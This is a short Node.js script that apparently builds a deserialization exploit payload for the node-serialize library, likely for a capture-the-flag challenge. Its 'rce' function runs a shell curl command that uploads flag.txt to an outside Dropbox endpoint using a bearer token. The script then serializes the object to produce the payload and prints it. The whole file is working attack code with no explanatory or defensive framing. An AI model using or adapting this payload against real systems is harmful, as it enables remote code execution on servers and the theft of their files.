var y = {
 rce : function(){ require(`child_process`).exec(`curl -X POST https://content.dropboxapi.com/2/files/upload --header \"Authorization: Bearer <Access_token>\" --header \"Dropbox-API-Arg: {\\"path\\": \\"/flag.txt\\"}\" --header \"Content-Type: application/octet-stream\" --data-binary @flag.txt`, function(error, stdout, stderr) { console.log(stdout);console.log(stderr);});}
}
var serialize = require('node-serialize');
var data = serialize.serialize(y)

console.log("Serialized: \n" + data);

var obj = serialize.unserialize(data);
console.log("Serialized: \n" + obj.rce);
